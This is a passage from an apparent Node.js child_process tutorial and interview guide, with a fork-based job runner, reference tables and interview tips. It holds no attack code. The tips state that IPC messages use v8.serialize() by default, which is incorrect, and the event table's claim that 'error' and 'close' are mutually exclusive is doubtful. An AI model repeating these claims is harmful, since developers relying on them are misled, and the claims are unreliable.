            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }

    // TypeScript: unreachable, but satisfies return type
    throw new Error('Unexpected: retry loop exhausted');
}

function runOnce<TInput, TOutput>(
    workerPath: string,
    input: TInput,
    timeoutMs: number
): Promise<TOutput> {
    return new Promise((resolve, reject) => {
        const worker: ChildProcess = fork(path.resolve(workerPath), [], {
            // Each job gets a clean environment
            env: {
                NODE_ENV: process.env.NODE_ENV,
                // Deliberately NOT passing all env vars — only what the job needs
            },
        });

        let settled = false;
        const settle = (fn: () => void) => {
            if (!settled) { settled = true; fn(); }
        };

        const timer = setTimeout(() => {
            worker.kill('SIGTERM');
            setTimeout(() => { if (!worker.killed) worker.kill('SIGKILL'); }, 5000);
            settle(() => reject(new Error(`Job timed out after ${timeoutMs}ms`)));
        }, timeoutMs);

        worker.on('message', (msg: { success: true; data: TOutput } | { success: false; error: string }) => {
            clearTimeout(timer);
            worker.kill('SIGTERM'); // Clean up worker after result received

            if (msg.success) {
                settle(() => resolve(msg.data));
            } else {
                settle(() => reject(new Error(msg.error)));
            }
        });

        worker.on('error', (err) => {
            clearTimeout(timer);
            settle(() => reject(err));
        });

        worker.on('exit', (code, signal) => {
            clearTimeout(timer);
            if (signal) {
                settle(() => reject(new Error(`Worker killed by signal ${signal}`)));
            } else if (code !== 0) {
                settle(() => reject(new Error(`Worker exited with code ${code}`)));
            }
            // If code === 0 and we got a message, settled is already true — no-op
        });

        // Send the job input after worker is set up:
        worker.send(input);
    });
}

// job-worker.js — runs in isolated child process:
process.on('message', async (input: { userId: string; reportType: string }) => {
    try {
        // Runs in isolation — crash here doesn't kill the main server
        const report = await generateReport(input.userId, input.reportType);
        process.send!({ success: true, data: report });
    } catch (err: any) {
        process.send!({ success: false, error: err.message });
    } finally {
        process.exit(0); // Clean exit after job completes
    }
});

// Usage in Express:
app.post('/reports/generate', async (req, res) => {
    const result = await runJob(
        './workers/report-worker.js',
        { userId: req.user.id, reportType: req.body.type },
        { timeoutMs: 60_000, maxRetries: 2, retryDelayMs: 2000 }
    );

    if (result.success) {
        res.json({ report: result.data, generatedIn: result.durationMs });
    } else {
        res.status(500).json({ error: result.error, attempts: result.attempts });
    }
});
```

## Quick Reference Table

| API | Shell? | Buffered? | IPC? | Use when |
|---|---|---|---|---|
| `spawn(cmd, args)` | No | No (streams) | No | Large output; binary data; long-running processes; user args (injection safe) |
| `spawn(cmd, [], { shell: true })` | Yes | No (streams) | No | Need shell features AND streaming; be careful with user input |
| `exec(cmdStr, cb)` | Yes | Yes (string) | No | Short commands with shell features; known-small output; quick scripts |
| `execFile(file, args, cb)` | No | Yes (string) | No | Like exec but safer/faster; no shell features needed; bounded output |
| `fork(modulePath)` | No | No (IPC) | Yes | Another Node.js script; need structured message passing; CPU-bound with isolation |

| Event | Fires when | Notes |
|---|---|---|
| `'error'` | Process failed to spawn | Mutually exclusive with `'close'` in spawn-fail case |
| `'exit'` | Process exits | May fire before stdio flushes — prefer `'close'` |
| `'close'` | Process exits AND all stdio closed | Safe point to read all output |
| `'disconnect'` | IPC channel closed | Only on fork(); fires when `child.disconnect()` called |
| `'message'` | IPC message received | Only on fork(); msg is deserialized JS value |
| `'spawn'` | Process successfully started | Node.js 15+; useful for "did it start at all" |

| Option | Effect |
|---|---|
| `stdio: 'inherit'` | Child shares parent's terminal |
| `stdio: 'ignore'` | All I/O discarded |
| `stdio: 'pipe'` | Create stream objects (default) |
| `detached: true` | Child survives parent exit (use with `unref()`) |
| `env: {...}` | Override environment variables |
| `cwd: '/path'` | Set working directory |
| `timeout: N` | Kill after N ms (exec/execFile only) |
| `maxBuffer: N` | Max bytes of output (exec/execFile only; default 1MB) |
| `shell: true` | Run through shell (spawn/execFile) |
| `uid/gid: N` | Run as different user (Unix only) |

---

**Tip for interviews:** Six things separate strong candidates on this topic: (1) being able to state the **exact relationship between the four APIs** — `spawn` is the primitive; `exec` is spawn with a shell and output buffering; `execFile` is spawn with output buffering but no shell; `fork` is spawn with the Node.js binary and an IPC channel — candidates who know this hierarchy understand the design, not just the surface API; (2) explaining the **`'exit'` vs `'close'` event distinction** clearly — `'exit'` fires when the process exits but stdio may still be draining, `'close'` fires when both the process has exited AND all stdio streams have been fully read; using `'exit'` to check output completeness is a race condition that causes intermittent data loss; (3) demonstrating awareness of **shell injection** with `exec()` — not just "don't use user input in exec" but specifically explaining that `spawn(['arg'])` passes args directly to `execvp()` so the shell never sees them, which is why it's safe; (4) knowing the **`maxBuffer` default on `exec`** (1MB) and that binary data through `exec` is corrupted because stdout becomes a string — strong candidates immediately reach for `spawn` for binary data or large output; (5) understanding what **`detached: true` + `unref()`** actually does — `detached` makes the child a process group leader, `unref()` tells Node.js's event loop not to wait for it — both are required for a true daemon, and confusing them leaves either the parent hanging or the child dying with the parent; and (6) knowing that **IPC messages use `v8.serialize()`**, not `JSON.stringify()` — this matters because `v8.serialize()` supports Dates, Maps, Buffers, and circular references, but large messages are expensive (copied and deserialized) so IPC is for control messages, not large data payloads.
